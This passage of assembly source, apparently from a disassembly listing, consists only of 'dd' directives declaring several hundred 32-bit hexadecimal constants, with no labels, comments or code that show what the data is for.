		dd 5EFA4847h, 0E91F7690h, 285DA37Ah, 2B454158h,	30732FA3h
		dd 818C8634h, 7FF297C9h, 33786627h, 583ED7BEh, 505AB4C0h
		dd 1328C41Dh, 274B1F5Eh, 6D23A150h, 0A0C83849h,	7D912339h
		dd 0F65534Ch, 0CCEB3297h, 15D385Dh, 0DD41E4FAh,	0F96C6FFFh
		dd 310420CCh, 28C7EB9Dh, 1E604A79h, 2ABA963Ch, 7E12DC37h
		dd 0D8D810EEh, 0A1ADFF04h, 5AAC641Ah, 62D91404h, 0B8C90645h
		dd 57A3218Ch, 0E29AB63h, 11EA8912h, 78E89421h, 6AF3FC58h
		dd 72150164h, 44F8C8BBh, 60EA5E06h, 27B57514h, 269B1450h
		dd 1842A49Ah, 62153930h, 0A48EC340h, 6858BB3Ah,	0F20A1EA7h
		dd 0BDC81CF4h, 5414B0A9h, 8ADA5B22h, 441010DFh,	262F87ACh
		dd 7824659Fh, 83E40F35h, 0C0545929h, 20BCD92Fh,	9596CA6Ah
		dd 0DD716EE9h, 434A50DFh, 0DB087A82h, 0B124D8F3h, 3A3ED71Ch
		dd 0EB80F368h, 0FFF6F604h, 69B4E43Fh, 3F806CCAh, 0E2C6337h
		dd 0E978AC26h, 80C35FD1h, 172B7DA1h, 2CB619A2h,	4F28D768h
		dd 0BDDC6329h, 6B4AFF81h, 489D9056h, 0B375AEA9h, 695B8B2Ah
		dd 23D8FAA2h, 1A5740DAh
		dd 7EA55F28h, 0AA82DE1Ah, 0EAA9BA4h, 94E983DDh,	5450394Ch
		dd 0C125AA4h, 8A5C42B0h, 83C2E61Ch, 62B01F6Ah, 51C14B7Fh
		dd 0A818546Ch, 0A5DE0DF2h, 0AE766C64h, 0A3FFB236h, 8DBADA3Bh
		dd 3EC8E96Dh, 32919FB1h, 0E78E6F2Bh, 41E33B94h,	71770BDh
		dd 334275CBh, 0CE3B313Eh, 612D8CD4h, 76A7E0ECh,	805AD540h
		dd 98E37B85h, 0C40E3193h, 549013C1h, 0D400E730h, 0BA13DEF5h
		dd 6196C0CDh, 0B57B3DBh, 5292CD59h, 953F9B3Ah, 348FC62Eh
		dd 24C3298h, 0DA6210CAh, 970BF082h, 2AA642ACh, 2BD976F6h
		dd 5C27804Eh, 4C0C32B3h, 425BB63Dh, 7C6BAAh, 0EF8F09AEh
		dd 0BBDB8863h, 658C4F8Ch, 0F76D296Ch, 0CD87751Eh, 0B9A197D6h
		dd 5F948A73h, 3B946E87h, 49BE431Ah, 2AE06514h, 7D463949h
		dd 0B761C46Ah, 0B18B38D3h, 0A8B1DA63h, 59EE463Dh, 0A46CE8C6h
		dd 0D96B83D9h, 1D64A2C5h, 340E5728h, 0C3631187h, 0EC254F06h
		dd 0BC9EC1DAh, 34BAA078h, 98CB5DFAh, 0EDDC0D20h, 72D5ED15h
		dd 0DBE22BF3h, 0F8CD9804h, 0B5B33E6h, 0C70ACFD4h, 0E908B983h
		dd 35274B3Dh, 871133ECh, 0CA3DEBD0h, 0F3ABC8B3h, 87F28DBCh
		dd 2D0B128h, 3C07C9A0h,	84F202F6h, 15DED8A7h, 0CDE0F92Fh
		dd 704DDB72h, 0BF4AD4BDh, 56974575h, 0DA21957h,	56272024h
		dd 0EF6AAF9Eh, 75A2DB71h, 1AE304A6h, 0C755B640h, 90CC03B2h
		dd 41AC1C0Eh, 3AE21CE9h, 0A97D749Fh, 8E8E22FBh,	0D70E755Fh
		dd 0E90EF977h, 39539971h, 708D35BCh, 0DE4B8962h, 8BED4821h
		dd 816884D0h, 8761FED6h, 0AA20F1D5h, 48445D0Fh,	442C5CC9h
		dd 534F4429h, 433557ABh, 0ACF7D5EFh, 12637881h,	19D6AAD2h
		dd 45F0627Eh, 67280E57h, 7CA626D4h, 0ED73397Eh,	1085BD3Ch
		dd 117CFB4h, 2F82E94h, 0FDF2D350h, 546C6826h, 975F04EEh
		dd 77BA4FF2h, 0FA5F4693h, 22F829BCh, 0BAEEDD4Dh, 761D33B1h
		dd 1EF1E7F4h, 0DE9CC18Ch, 0BC065413h, 2ACF7941h, 23234F5Bh
		dd 8CA326A0h, 3122EA8Eh, 0CCA24823h, 2685C2A4h,	0EF2B3C47h
		dd 559E40Ch, 0A13B7F7Bh, 0D9A1314Ch, 3FAE0E3Bh,	31AE4C44h
		dd 73403822h, 397E75D3h, 0E9D04A13h, 0E158312Dh, 1030BFFh
		dd 58B7AC07h, 6EC4BD0Dh, 32CE1262h, 99E28769h, 94567D0Ch
		dd 91B11F22h, 51CA5CC0h, 67F93CB2h, 2773FB4Ah, 11EBB1C4h
		dd 5C9F255Ch, 0B03B5721h, 0B8D52755h, 5A5A2F98h, 6A739948h
		dd 0F0F1B0F4h, 4278178h, 0E6EF02BCh, 6FEA3201h,	597A0252h
		dd 29975672h, 1DEAE59h,	44BC7042h, 0CEEBB732h, 0B81D5BD5h
		dd 557F2988h, 3E7086B9h, 1B7DD165h, 367F747h, 0F51F0ADCh
		dd 0ACADA347h, 0B3AFCAC9h, 0E20B2694h, 5FD805D5h, 0E7D8B427h
		dd 0E4B7C12Ch, 0C24B2813h, 2E4782D1h, 0E48EAB42h, 5F396163h
		dd 0C40A906Fh, 0EEB2A1FAh, 9E912C34h, 70D62506h, 0CC4399A5h
		dd 5808BD47h, 0D150DBB3h, 67B984A7h, 0F20F4D3Eh, 4AA2A099h
		dd 0D7A981DAh, 2949CB51h, 6D8846C0h, 0C1B0E26Ah, 0A4F8775Ah
		dd 1CD82A42h, 0F14EF2E4h, 8C4F9507h, 87F7C461h,	31734BB6h
		dd 2C211668h, 501AA74h,	8714E39Fh, 9A3FF2D4h, 0C0144D33h
		dd 0F8D80271h, 5D37C650h, 0C494D260h, 0D13DDF1h, 0C37B54F7h
		dd 911BAC76h, 0BE598909h, 14F2D029h, 0B06FADDCh, 91C0F4FBh
		dd 39530C1Dh, 0CE2EF338h, 0E505281h, 45C89B7Dh,	702B6296h
		dd 0CC5BCC20h, 46827CA3h, 332B8CF7h, 0F8F9919Dh, 76BB5CC2h
		dd 8D9839CAh, 65ED2D5Eh, 5089CB75h, 0E0D4A1ABh,	0CAA6B08Ah
		dd 9CC6FCE8h, 0D30D951h, 20B57079h, 5DEB1B39h, 9CF93656h
		dd 0D65765F5h, 0F910866Ch, 19F17927h, 25156C74h, 1081C335h
		dd 0DA8BBFA9h, 865A3B7Dh, 2C3EF69Fh, 0A2EF8D45h, 0BD4B698h
		dd 0FE503305h, 65801531h, 1ED5C4B7h, 0BD382426h, 7EAC9DD4h
		dd 0AF9A9032h, 78F480D1h, 0ACEB6BB9h, 640DCFA2h, 41B0FD5Fh
		dd 0FFD87DE8h, 0A3972D30h, 2E850678h, 7C0FD0AEh, 25615C64h
		dd 9B37828h, 5A5D6753h,	52D68F92h, 0AE4DDDCCh, 0B8A403C0h
		dd 4212B473h, 38F71657h, 62A89633h, 56602AC7h, 23F48C58h
		dd 92050EF1h, 1C8F1B49h, 0B1D68EF5h, 22BA5723h,	0A92D0A95h
		dd 36C174B8h, 14946D41h, 0FF407D34h, 32C0934Eh,	514ECC45h
		dd 0B002D364h, 3BCC81Bh, 2CC0AF46h, 5FE9ADC5h, 5D446343h
		dd 27F387EEh, 754474FBh, 0E9CBFD76h, 5793A9F7h,	0A229B00Dh
		dd 0ED2A661h, 3FF08394h, 486A3A68h, 533755B7h, 0C935D64Dh
		dd 0AB20644Fh, 7365B640h, 2D599E74h, 74F29F21h,	0AE797F2h
		dd 7E9C7A69h, 0F990BA40h, 53E64E53h, 4062FA01h,	3DF39565h
		dd 404618B5h, 4C6FBF81h, 416250C2h, 0E35ED1F0h,	30F4F0AAh
		dd 0F8CEE7ECh, 0CD21DAE7h, 7414FB7Dh, 115A35DAh, 6C551A9Dh
		dd 8C5AEA6h, 1CE820F0h,	0FD9CF40Eh, 7A379F59h, 5FF7B31Eh
		dd 5DCCC0C8h, 0E1589B51h, 40A3F4CBh, 67EB27B7h,	283A39DCh
		dd 4FB49B58h, 0A207C174h, 0BDF2C2E8h, 0C96EB68Ah, 15308126h
		dd 5FD256D0h, 4AE35C70h, 0C9C546A4h, 0A9F86BFh,	0A290D044h
		dd 71156F93h, 540E67A7h, 0A2D935B0h, 0E5A0D19Ah, 0C0B1E44Dh
		dd 9CD5F563h, 219ECA7Dh, 0B2927579h, 76238484h,	4E3EC08Dh
		dd 1EC34BFEh, 60E1ABBCh, 0D3208679h, 663350E1h,	0EB599202h
		dd 0D321966Bh, 0A01ABDDFh, 8545B859h, 1832DEB0h, 25021C64h
		dd 5AB6D947h, 0B63CE08h, 0EBE7EFD4h, 79B3666Fh,	1CE03A26h
		dd 51A09B96h, 15525223h, 0F70A43C5h, 0D40CD934h, 0C68CBC74h
		dd 40770DFAh, 404654AFh, 0D496C42Ch, 930907AEh,	4B152C75h
		dd 6F567F35h, 0F41405F1h, 0EEC8B4FAh, 547649ACh, 887D0854h
		dd 43A94AF7h, 0D4A2C032h, 3B11389Ah, 29024A23h,	0B260044Bh
		dd 956E07A8h, 0A7C56929h, 0BF111FC3h, 99D4A984h, 0C5AE9DE1h
		dd 0EF94A0E9h, 0A358E90Dh, 248B9010h, 3574FE2Ch, 0EACFD7F9h
		dd 65FA1453h, 51BDFCF3h, 34B9DF03h, 0CE5C9827h,	541B42A1h
		dd 9853C31Ah, 26B3047Ch, 0A7971F8Ah, 88BBB8FEh,	0BB8A3441h
		dd 2A4C27A8h, 0B827A4A5h, 783D6244h, 0A5B2EBCBh, 0CAC64A1h
		dd 3A18DC8Dh, 1D6AEBF0h, 5CDD65B5h, 0FDC2A41Ah,	0A9AE4E26h
		dd 898F75A2h, 71D66A55h, 5C428F74h, 165C1CEDh, 747571Dh
		dd 1080333Ch, 0C9C69DCFh, 3B8A0A7Ah, 329C2499h,	727C3ECBh
		dd 13677A7Eh, 0B939D84h, 0C3DCB948h, 0DA6548C1h, 0B9F12655h
		dd 3C765B2h, 8B66A00Dh,	0BB417F3Dh, 92403AE5h, 0D2D96925h
		dd 95F9462Bh, 0EA44DFA2h, 6405A5C0h, 0FEA88751h, 0D6691E0Eh
		dd 6977DFB3h, 4143B125h, 0D8B1267Fh, 4AD4B2ACh,	5665D2AFh
		dd 0E24B8812h, 9CFC2405h, 68AA462Fh, 0CFC9BC9Bh, 0D50EB0FCh
		dd 5842FF52h, 0F204FA03h, 0C96D6684h, 5DDDFD7Ah, 4B75E1FEh
		dd 4876E0B3h, 9780D1B6h, 3FA0F1D7h, 369CFFF9h, 8E00964Eh
		dd 6C525CD0h, 614F2A78h, 203D49FFh, 40B7F4ECh, 235FD75Bh
		dd 44A44BE8h, 2531E317h, 289B3491h, 3551F57Ah, 0D5F4CEBCh
		dd 0FCF9DCE2h, 0F0218F1Ah, 0E847B9BAh, 1B395F10h, 6F246BCFh
		dd 0B11DE281h, 0AA63E4E0h, 9385C7ECh, 4E6CA390h, 0F865DBBEh
		dd 41AEC328h, 4E000BC6h, 516C36C1h, 0CB1BD160h,	28AF6EB4h
		dd 7A807089h, 0F262252Fh, 61160627h, 0D0407515h, 0FE2C4A24h
		dd 3D915Fh, 0ED6242B2h,	6F755BA3h, 10E3B798h, 6A0C9E47h
		dd 0CA2A11DFh, 0DC2F22D0h, 0DAD727FBh, 6277C45Ah, 8F6E8A4Ah
		dd 3EF19D90h, 81AA7EF2h, 0E528ABCFh, 380008F0h,	11E3DF16h
		dd 8EC0389Dh, 8B14C9C2h
		dd 933F6489h, 9A3971D5h, 13E988D2h, 0AB16A5A6h,	99B2F8CCh
		dd 0FB241648h, 0E984D77Fh, 0F3CC3EB0h, 2008A959h, 68204A61h
		dd 61FF1B32h, 6B6BE225h, 0D7798040h, 8B408663h,	0B96E1B02h
		dd 0D8DF9F46h, 8695E79Fh, 798246E1h, 0F1D07725h, 570640B4h
		dd 0C242CEC0h, 0F2680FADh, 6141F7E7h, 1FAF3692h, 0BE0AC731h
		dd 0C6D40EC6h, 199560B9h, 0D2E755FDh, 158B6037h, 0FEC167FFh
		dd 0ECE5DF2Dh, 41E81B10h, 0D3ED8707h, 0EB58A959h, 7F925EC1h
		dd 6131C018h, 2FE39974h, 0BF52C9A5h, 0D443DA8Fh, 0BA1AC4FAh
		dd 30A58A1Fh, 75DE4802h, 0D7C17064h, 1128AE6h, 437192D3h
		dd 78F84FC0h, 809064E7h, 814EC898h, 21F3FA34h, 9B4D362Dh
		dd 936A38Ah, 6AF69101h,	31C47575h, 1D10FC89h, 0B759B8E4h
		dd 0F2F13F8Dh, 0DB0D6996h, 0BC10A46h, 4F42FAE7h, 84425067h
		dd 1E1E8A98h, 1B7F734Ah, 0EB53CE79h, 0E5C2D01Bh, 84C7FB9Dh
		dd 58F0A543h, 0FBA5B961h, 0EC5364C6h, 0CCFFCF10h, 4078851Bh
		dd 0EC0D9B1Bh, 0F86EE264h, 0C3842000h, 48A6ECD2h, 0C36DB50Ah
		dd 83019D5Bh, 37079123h, 1BF55662h, 73103B2h, 0E84102CEh
		dd 0AA58EDC0h, 8949CAA9h, 0AC4A9B50h, 133912E1h, 0D3F60933h
		dd 1AB63072h, 16366809h, 5ED93F9Bh, 6BEA1AC1h, 0F54147D1h
		dd 0FEE51C55h, 5854FFA1h, 20CB597Dh, 5F7D09Fh, 7DFD72C6h
		dd 6D9F2EFBh, 0FDFEA5FAh, 0ADEAE01Bh, 0F12241F5h, 742D073Ch
		dd 265E89B9h, 2685B204h, 2EEB3F8Ah, 2E9252FCh, 6C520164h
		dd 53CF050Bh, 6B597DE8h, 1DDAF595h, 0AC12F403h,	2B059E88h
		dd 0ED63D6FEh, 315CC922h, 0AF7C2301h, 93A22366h, 461129ECh
		dd 4D346748h, 9AEFB09Dh, 0DCA70037h, 2F73F906h,	8AF3FCFFh
		dd 36949448h, 0DD9B9A25h, 103D76E0h, 5A4B0498h,	63E6E373h
		dd 0D2D53F2Bh, 3BCC10DAh, 616877F6h, 39398BA7h,	0BC9BE986h
		dd 48801753h, 7FFA4916h, 3A407B4Ah, 4ADF79AAh, 97DEEEADh
		dd 305F58B2h, 4DA30778h, 0A9EC455Ch, 55BC51DFh,	62C61D54h
		dd 8F0C1695h, 0AD3C1670h, 95B5CD64h, 658C0752h,	24051506h
		dd 0F558685Eh, 36D039C5h, 0C61E01F3h, 90D8C20Dh, 0D0EF0529h
		dd 8DB0EADEh, 0C807E799h, 732336A7h, 4B367675h,	19BB5751h
		dd 0F0EA732Fh, 2DA9A6C6h, 3B00BD69h, 644C35BEh,	2D697B7h
		dd 0BE1DCADAh, 0B449F732h, 7A203DB6h, 0C59D08C2h, 0EC1DD8EDh
		dd 0E2C14ACBh, 8158B0F7h, 45725530h, 988D6226h,	87F6F1A3h
		dd 0E12FD857h, 9869D791h, 43F85027h, 56303573h,	641098A1h
		dd 7FC0B365h, 18B74AEh,	5429324h, 2B4DD73h, 0F23B870Bh
		dd 0EAD8D040h, 0BF7D5754h, 0F0861366h, 0F7356A4Fh, 2F2D9BD8h
		dd 0B1B4E996h, 81874378h, 357D3CB8h, 1B286038h,	0FA16C1E1h
		dd 105F0069h, 0C005014Dh, 965AD75h, 501EDB71h, 880C9158h
		dd 5E636CC0h, 35A0453h,	0EF9E7C0Ch, 770E59A8h, 0F72C719Fh
		dd 873EDB2Fh, 2B8CAE77h, 3A8513A0h, 0B1EE1230h,	728B197Ch
		dd 0F9AD532Dh, 7395D016h, 4D685803h, 0EA627BEBh, 0FA151155h
		dd 0F5775BC4h, 0C73B81F8h, 0B0614B92h, 56164BDBh, 66088BC3h
		dd 0FAA82668h, 78EECA0Dh, 50F1AEB7h, 22AC51ADh,	0E6B3A495h
		dd 90067DF5h, 0BA78D529h, 4A856226h, 284D2F3Dh,	24B6338Fh
		dd 33687FA8h, 66C36293h, 0F61581E7h, 0B5F82678h, 32454412h
		dd 0C7F7B808h, 8A96729Bh, 6FCDC975h, 8834294Dh,	70C458h
		dd 0CB35BB7Ch, 591A2BDEh, 0A25FB79h, 9B52DD8Eh,	47DE4A78h
		dd 0EC08F6F1h, 53262BD4h, 3A16ADD0h, 0DBB6842Dh, 0A9FDC265h
		dd 30924C34h, 0BF79CC26h, 68575E1Ch, 0A90DC3F6h, 623714B6h
		dd 6646DA95h, 0EEFC68DEh, 170B94B1h, 511FCBACh,	8A473CD9h
		dd 0D720953Dh, 762EFE29h, 26B11D9Fh, 0E83A5EF1h, 248C6BA9h
		dd 1B29C4ACh, 37F0B90Bh, 937E94DEh, 0D65158B0h,	0B5C89340h
		dd 0D30B4360h, 57CD342Bh, 78F22021h, 622A540Dh,	8D61CB3Ch
		dd 5BF48B84h, 183E3378h, 5B0C1CFCh, 0E555E640h,	0E809560Ch
		dd 0F9A2A380h, 29B95EEDh, 31728CE3h, 9A338FFFh,	446D6FBCh
		dd 0CAEA21D0h, 0E96C4A40h, 4716835Dh, 6C0D4Ah, 6ACC9355h
		dd 0F7F6F5EEh, 0DE39942Bh, 3A139B55h, 0AFE5D7B3h, 19E255BAh
		dd 0E6158979h, 6DA1ADECh, 0B0321612h, 8E487103h, 88EB39F6h
		dd 0D2EB708Bh, 0BA00E283h, 3EAFEA0Ch, 412353C7h, 4B6BEA1Bh
		dd 5C045188h, 5DB95905h, 84FCAD6Eh, 62BB1CABh, 569F356Fh
		dd 0A00EA586h, 91EE475Eh, 5FD38F27h, 0A0A7ED90h, 0AD760362h
		dd 2751FC3h, 5E62FB67h,	0BDDB3F33h, 55A6649h, 20220DEFh
		dd 0F2A73DBDh, 0EC77BAD4h, 60EB2510h, 20841F1Eh, 5427D158h
		dd 85DDD6F3h, 0DF3BA865h, 0BA57105Eh, 72160400h, 13B09DABh
		dd 765074BEh, 0CD4F4CD3h, 46990CC8h, 0E6DA380Ch, 0B6425B7Ah
		dd 1C7BF11Eh, 9C24892Dh, 0FCEB252Ch, 3214ABEBh,	86DF2D6Ah
		dd 0B23D9D29h, 0E3F39812h, 0F9C20670h, 3FFE2CC8h, 15A3585Fh
		dd 94005D63h, 2F503011h, 573D1247h, 25D1F3BBh, 17934946h
		dd 656C8566h, 7495269Fh, 49C41D49h, 773319C4h, 609B5E9Bh
		dd 4640EF0Bh, 0E1841FCAh, 891320FCh, 31F255E8h,	3CD0D42Eh
		dd 58CFA996h, 7A628A71h, 6286448Ah, 96A7D048h, 8CC84D25h
		dd 0CB0E950Dh, 6BEB25A2h, 129E5125h, 0FDF4DE0Ah, 0FC857535h
		dd 7284E49Fh, 0AD880B93h, 4B1B70A7h, 257D87D9h,	0E761D736h
		dd 8BEFE0F7h, 5725615Bh, 9EC41CA5h, 55D34C2Dh, 0A4CBC2F0h
		dd 3FF4D4CCh, 4E83CF11h, 743A01A2h, 0A3A1E8DDh,	455C8718h
		dd 0C96C54D9h, 0F29FB02h, 994FB32Ah, 6A9FACDh, 0E3CE147Bh
		dd 47DE8F01h, 0E02CBFFBh, 0E14E65Bh, 0B6DC5368h, 5FAC85A0h
		dd 0CB293022h, 87C3F017h, 3DEE0764h, 6E4F56ECh,	2560ABC8h
		dd 2985A354h, 5593F5E9h, 0E544BC43h, 5188B759h,	0C9AA8F86h
		dd 3E38AC55h, 53131F43h, 1D152B7Ah, 0CF635214h,	14F1EA2Ah
		dd 0F82EAA22h, 0BEE5B7B5h, 68EEDBEAh, 0D481A15Ah, 5D4988A3h
		dd 2C591780h, 6A56AD34h, 5A299108h, 8E2191CDh, 3B560E27h
		dd 992808D3h, 249800A8h, 48A705BEh, 0CA55E034h,	0D9BCDCAEh
		dd 6240EFA8h, 71D35BBEh, 0D61C0C75h, 0D1649C8Bh, 0CAA9BF22h
		dd 8B62FF6Ch, 362F4DE3h, 800A6BF5h, 4B51271Fh, 0F8E7D328h
		dd 0AD0CFDF6h, 705A189Ah, 0AFE821D7h, 29855A90h, 0A902CFDDh
		dd 2DAB07F0h, 0F3EF330Dh, 0E22456EDh, 0C94AE043h, 52FC7DC1h
		dd 3EC31FC6h, 0EE6FD076h, 0C60E7B85h, 0D3E6CFEDh, 17F7F167h
		dd 0F10C5DD6h, 9552E407h, 0F1EF0568h, 2BFCBF0Fh, 45DA0E48h
		dd 9FD5EFAh, 32E277BAh,	2F14F37Fh, 4DA36872h, 0A3B222F9h
		dd 9E078AD1h, 877190DEh, 0BE0A5B0Eh, 2ABBB45Ah,	10A3C8CEh
		dd 0BE6933AFh, 6EC43B16h, 11C98B8Dh, 4430315Fh,	6D2D52F3h
		dd 8B8CC066h, 0F265593Fh, 0AEF35755h, 0CE038FF1h, 0E0B0B4A1h
		dd 90DF6B9Ah, 0B0229B80h, 0B2B9061Ch, 0CD11ED4Ah, 64DB55FFh
		dd 8079B229h, 0CE86276Bh, 0C7E9091Ch, 4D078BCAh, 0AA77C913h
		dd 49C4194Eh, 1D1EEA04h, 28C4EE64h, 365F972Bh, 0AD117D4Fh
		dd 0DA75470Ch, 21D3251Bh, 887ED93Ah, 475C636Bh,	5A43AE3Fh
		dd 1F4223CBh, 0D165EB49h, 192B86E1h, 0E7C43801h, 0E94BF074h
		dd 0FCFF6BE2h, 0D5669722h, 19D14689h, 9D0FFBDDh, 0D4EC8F86h
		dd 0CA630878h, 0DBDD7C9Eh, 0B2158FD2h, 0E6612032h, 62C65547h
		dd 196662C9h, 10AA8BE8h, 0DF2FE73Ah, 0F1C5B216h, 1B13774Eh
		dd 0EC65C5C0h, 99CF380Ah
		dd 29917697h, 0FFE00DD9h, 0A184DE57h, 326C5FB9h, 57B519EFh
		dd 2AF54F5Eh, 0E964BC9Dh, 77DF1D94h, 0B9F460FAh, 0DC3E8B02h
		dd 94CBED4Dh, 0C054CD84h, 0FA7FF71Ah, 0BF1467A0h, 0E39DF700h
		dd 468868CFh, 7604880Ah, 18F7CB9h, 8C0A752Ch, 0B8EE4077h
		dd 0A3D92589h, 6515298Fh, 66C4B6D2h, 2B5CE43Eh,	34796541h
		dd 51605821h, 9AFA6373h, 0BC7E6DFh, 716E8AADh, 148C0888h
		dd 0C626C4EDh, 4D9FCF49h, 7409FDA6h, 6B7A0C5Ah,	1D6411D6h
		dd 595D061Ch, 9590D691h, 6BA6CB24h, 79EE37A6h, 0A1825D3Eh
		dd 649E79D2h, 786E5E64h, 0CCC264C3h, 0BC1E35ADh, 0E06B353Bh
		dd 146520A0h, 342F098Bh, 0E3B0BC3Fh, 9436310Bh,	0D11E4F1Dh
		dd 323590FDh, 0B5A71AD2h, 4162BD02h, 0F94F15A3h, 567CAA99h
		dd 4BB336A6h, 8213D894h, 0CB654422h, 4EB9D7A2h,	0A6F10F25h
		dd 0FD15479h, 0B8981C96h, 99852B8Ch, 0FB3CE7D4h, 197EAD8Fh
		dd 0A362FDDEh, 0A3E4D642h, 0CCD3AD4Dh, 4A4FC59Bh, 826277Ah
		dd 24A225A2h, 0E120BEA2h, 1BE3683Ch, 98F0E42Fh,	49C6F91Ah
		dd 0D0A75D58h, 0E36DA98h, 0A6165370h, 19662BD0h, 34D52BBCh
		dd 5F961076h, 8219E07Bh, 196227AAh, 8604AB85h, 54082355h
		dd 0EBCD60D1h, 43F2F54Eh, 0B69ADBC0h, 0C95138A0h, 0D8377043h
		dd 726F6FE4h, 794368Bh,	0B2FC79FEh, 69DE684h, 0F38A110Ch
		dd 0BF002207h, 6DA5EE54h, 256E7542h, 968E1CB4h,	716B7235h
		dd 5C297D68h, 92889990h, 1E55CF77h, 0ADF53D93h,	8C09138Eh
		dd 2B204974h, 4B130F97h, 1CAAD5D0h, 343A0ACFh, 1A9353ECh
		dd 9EADED5Bh, 46709489h, 63E5C072h, 0E5C709A5h,	6E7CA0B3h
		dd 143D11EEh, 5778A04Bh, 968CC68Fh, 0D1496481h,	6C3F2DBDh
		dd 357C095Dh, 8C0D799Ah, 3314F478h, 542F0B6Ah, 8FA403A0h
		dd 0C7C42C5Ah, 0DB423CBDh, 0B22566DBh, 103943A3h, 7576D858h
		dd 5B9D5CB8h, 21C55A0Ch, 0E87F233Ah, 56C9421h, 5F53450Dh
		dd 3363470Ah, 3B8B9397h, 63C2D924h, 73035370h, 0C3D9A7C7h
		dd 3ABA90F7h, 0A21982F2h, 6E569E17h, 0A5FA7EE5h, 8304FB96h
		dd 8B269509h, 0B842F6DAh, 13328584h, 982C2D90h,	35E2F56Eh
		dd 9A0C6DF2h, 0A33FC621h, 84AAF7A0h, 90D64F1h, 2F833D3Dh
		dd 0A132FF8Ah, 0C19B3B85h, 12980144h, 903C359Ch, 6912934h
		dd 712FDDA0h, 33527BB3h, 0C930BA26h, 0C93CBDDAh, 0D5E3FFF5h
		dd 3E09070Bh, 8CD881DAh, 0C834CCEBh, 0FF2BCAEFh, 67F55865h
		dd 9E450760h, 0B3776D06h, 9D59E63Bh, 0C0BD546Ah, 0F461254Eh
		dd 3E992F70h, 0A82B284Ah, 18F53005h, 6A110CC6h,	29737295h
		dd 9F41DC38h, 0C4C9FC21h, 76ED6CAEh, 0E1031499h, 873F7EF1h
		dd 0E85A848Dh, 3EE4CAE2h, 3C183703h, 7AF2C36Ah,	8120E262h
		dd 0D9A7AFA3h, 1BD05221h, 20636406h, 97DB7CD8h,	5396C139h
		dd 3AAB853Bh, 39222B7Dh, 0E72E3B24h, 96D88E1Bh,	81ED407Bh
		dd 2F23F957h, 953EB98Ah, 0BCA86755h, 63A91183h,	68B95069h
		dd 2E3D4703h, 7EFD6E4Eh, 92B3E733h, 2D4A799Dh, 25F23756h
		dd 68E6CB2Ah, 1A3A7D0Dh, 508F9948h, 2E365C3Fh, 0E5F75C3Ah
		dd 0AAEBF309h, 9D158C29h, 95D3007Ah, 70D2BB0Bh,	4A9CA66Eh
		dd 39EF00ADh, 0B8EB1E51h, 670CD2B3h, 5545D11Ch,	4FA9A98h
		dd 3E7F998Bh, 0DA045C26h, 2847E522h, 91941EC1h,	0A433F93h
		dd 0BEF68EECh, 39D5B96Fh, 0E5363017h, 270283BEh, 0E156C7Ah
		dd 75043F55h, 0C0742380h, 4C964D44h, 0A5380A7Bh, 72A8B448h
		dd 0AB6284F5h, 5EC15EDAh, 0AEBC5FBDh, 0E2DE207Fh, 0FECC28Dh
		dd 28F65AB3h, 3504E95Dh, 0D4984CF0h, 2CC13CABh,	0CC82C112h
		dd 9C663543h, 0B7231048h, 71DA0C9Fh, 103B064Bh,	0B0262DD8h
		dd 0FD13A710h, 339FCC8h, 0CDE5FFC3h, 321793F7h,	3C440D23h
		dd 0F3B403BBh, 0CB376BD1h, 8C8CE281h, 0D9A87A5Fh, 0F6AC22F8h
		dd 0FF6DB7DAh, 0DF4B518h, 0CF5EC0A8h, 0B2D61BE3h, 0C7A888B7h
		dd 0DD330826h, 0AE1B290Eh, 0DA21B43h, 23FE64BFh, 0F98A137Eh
		dd 39CDDD7Dh, 0BDB455EDh, 0D5021327h, 9F884797h, 0A43694CCh
		dd 5168F6E1h, 3E8C0813h, 0C1AF20B8h, 8D0F22B9h,	0D0712602h
		dd 7D7C2567h, 0B76C21A6h, 14A270BEh, 8287DA05h,	5D993C7Ah
		dd 0E3692959h, 52D25C2Ah, 0A08B6F1h, 3FFC554h, 0E98C97Dh
		dd 2303AD46h, 0E6EF45C1h, 7B9F4EACh, 3C78EA70h,	91C7E7B7h
		dd 0E9BFA85Dh, 0CF655695h, 0B4AFC36Fh, 9A0BCB5h, 81329ED1h
		dd 0AC9E278Ch, 0A917EFA1h, 0C786BB54h, 12686D6Fh, 0EFD04394h
		dd 169361C6h, 4F38E74Ah, 4A21F452h, 0B7CE3CFAh,	0B7E17FF9h
		dd 860F99D0h, 5DD464FAh, 5B8ED1BFh, 2EEC249Bh, 3A3B667Ah
		dd 0E3CD2C5Ah, 7EEF8E6Bh, 0D6175FFFh, 58EF7C2Bh, 10C76E72h
		dd 55D35F06h, 874576C5h, 63E476CFh, 4C3D02A2h, 9861295Eh
		dd 5A83D119h, 5F780C8Bh, 0D7C1399Eh, 77736110h,	0B683B954h
		dd 0C42C93A3h, 5378000Fh, 0CE1F01F4h, 0BB734FEAh, 0E7F69636h
		dd 0D4AF83Ch, 0E841B730h, 0C8B0A076h, 67DC405Eh, 0D8B54431h
		dd 8111B051h, 0A6B6CEB5h, 0B9CA5294h, 25B9472Fh, 8BEB3C0Bh
		dd 53BBFBECh, 7438203Fh, 94CC4DD6h, 95A964E7h, 0CF418F66h
		dd 2B92A174h, 25BD6CFh,	0A3CA3142h, 6166CD2Bh, 12468B4Dh
		dd 35FA0A4Ch, 3F8A2141h, 940B319Fh, 9C380795h, 8E29147h
		dd 8ED99475h, 8B7402B9h, 3C6E4D29h, 4640A4B6h, 0B17B7DCh
		dd 3E5A1358h, 4FA71FE8h, 3250026Ch, 0F7A366FCh,	3A18D9A9h
		dd 2F508662h, 0D1E0B420h, 0EDC69387h, 0A904029Ah, 95C32BEFh
		dd 0FD7EF459h, 0F15A8412h, 35672A6Eh, 44D98DB1h, 2B1F048h
		dd 728ACEAAh, 150EDF15h, 0B66D46AEh, 262AE633h,	0E5CA5B5Fh
		dd 661A8095h, 5BA932DEh, 699D2D71h, 0F21D8E09h,	3CB1C028h
		dd 962155Eh, 0DE27D50Bh, 5F4FC046h, 0AF10AE81h,	0F8152482h
		dd 7E5D1CA0h, 65C7C5DEh, 1CC6D0E3h, 86F6F7B9h, 61AD7E6h
		dd 0BE307CA6h, 0DFFE142Ah, 792C73A7h, 962A478h,	0A92AB7E1h
		dd 9B133B0Ah, 0AE2B43DFh, 15FC17FAh, 0FA14DE17h, 0FEFB2769h
		dd 0B9BF02h, 8852034Dh,	75AB1CA1h, 3A30F536h, 2CA0845Ch
		dd 0C8D1674Bh, 26A523A7h, 293725A8h, 340083E9h,	25A7F365h
		dd 1F0F5188h, 30B49CF9h, 1BDDDE41h, 0B7F9AE52h,	9031936Fh
